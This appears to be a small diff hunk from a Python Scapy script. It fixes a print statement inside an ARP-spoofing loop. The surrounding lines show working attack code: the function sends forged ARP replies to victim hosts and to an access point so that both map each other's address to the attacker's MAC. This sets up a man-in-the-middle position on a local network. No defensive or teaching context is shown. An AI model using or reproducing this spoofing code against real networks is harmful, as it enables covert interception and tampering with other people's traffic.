@@ -78,7 +78,7 @@ def arp():
 	for v in range(len(vip)):
 		for i in range(10):
 			print('send arp ', i)
-			print(vip[i],vmac[v])
+			print(vip[v],vmac[v])
 			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2))
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2))
 			time.sleep(0.1)
